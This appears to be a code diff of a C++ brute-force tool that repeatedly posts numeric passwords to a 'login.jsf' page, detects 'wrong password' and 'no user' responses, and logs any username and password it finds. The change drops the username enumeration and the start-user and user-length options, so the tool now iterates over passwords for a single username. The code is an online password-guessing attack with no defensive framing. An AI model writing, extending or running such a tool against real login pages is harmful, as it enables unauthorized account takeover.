@@ -27,10 +27,8 @@ const char* usertype             =  "1";
 
 long times                       =  5L;
 long start_pass                  =  0L;
-long start_user                  =  0L;
 
 int pass_length                  =  6;
-int user_length                  =  9;
 
 bool is_debug                    =  false;
 bool is_remove                   =  false;
@@ -38,9 +36,6 @@ bool is_remove                   =  false;
 string code;
 string content;
 string strpass;
-string struser;
-
-FILE *debug_fp;
 
 
 ////////////////////////////
@@ -124,7 +119,7 @@ string get_dir_name( ) {
 string get_debug_file_name() {
     string name = "";
     name += get_time( true );
-    name += ".debug.user";
+    name += ".debug";
     
     return name;
 }
@@ -185,10 +180,6 @@ size_t write_callback( void* ptr, size_t size, size_t nmemb, FILE *data ) {
         cout << "\tFIND: no user" << endl;
     } else if ( str.find( str_wrong_password ) != string::npos ) {
         cout << "\tFIND: wrong password!" << endl;
-        
-        // save the result
-        fprintf( debug_fp, "user:  %s\n", struser.c_str() );
-        fprintf( debug_fp, "------------------------\n" );
     }
     // cout << str << endl;
     if ( is_debug ) {
@@ -223,10 +214,6 @@ int main( int argc, char** argv ) {
     int is_remove_opt_len     = (int)strlen( is_remove_opt );
     const char* pass_length_opt = "--pass-length=";
     int pass_length_opt_len = (int)strlen( pass_length_opt );
-    const char* start_user_opt = "--start-user=";
-    int start_user_opt_len   = (int)strlen( start_user_opt );
-    const char* user_length_opt = "--user-length=";
-    int user_length_opt_len = (int)strlen( user_length_opt );
     
     // Get the options:
     for ( int i = 0; i < argc; ++i ) {
@@ -250,10 +237,6 @@ int main( int argc, char** argv ) {
             is_remove = true;
         } else if ( strncmp( argv[i], pass_length_opt, pass_length_opt_len ) == 0 ) {
             pass_length = s2i<int>( argv[i] + pass_length_opt_len );
-        } else if ( strncmp( argv[i], user_length_opt, user_length_opt_len ) == 0 ) {
-            user_length = s2i<int>( argv[i] + user_length_opt_len );
-        } else if ( strncmp( argv[i], start_user_opt, start_user_opt_len ) == 0 ) {
-            start_user = c2l( argv[i] + start_user_opt_len );
         }
     }
     
@@ -287,6 +270,7 @@ int main( int argc, char** argv ) {
     }
     
     // DEBUG FILE
+    FILE *debug_fp;
     debug_fp = fopen( get_debug_file_name().c_str(), "a+" );
     
     for ( long i = 0L; i < times; ++i ) {
@@ -348,15 +332,8 @@ int main( int argc, char** argv ) {
         
         // THIRD: post login.jsf
         // change password
-        cout << "strat_user: " << start_user << "\ti: " << i << endl;
-        cout << "start_pass: " << start_pass << endl;
-        cout << "user length: " << user_length << endl;
-        cout << "pass length: " << pass_length << endl;
-        username = num2str<T>( start_user + i, user_length ).c_str();
-        password = num2str<T>( start_pass, pass_length ).c_str();
-        struser = username;  // copy username to string
+        password = num2str( i+start_pass, pass_length ).c_str();
         strpass = password;  // copy password to string
-                
         reset_content();
         if ( is_debug ) {
             cout << "==== THIRD ====" << endl;
@@ -397,7 +374,7 @@ int main( int argc, char** argv ) {
                     
                     // Save the result
                     fprintf( debug_fp, "time: %s\n", get_time( true ).c_str() );
-                    fprintf( debug_fp, "username: %s\n", struser.c_str() );
+                    fprintf( debug_fp, "username: %s\n", username );
                     fprintf( debug_fp, "password: %s\n", strpass.c_str() );
                     fprintf( debug_fp, "--------------------\n" );
                     
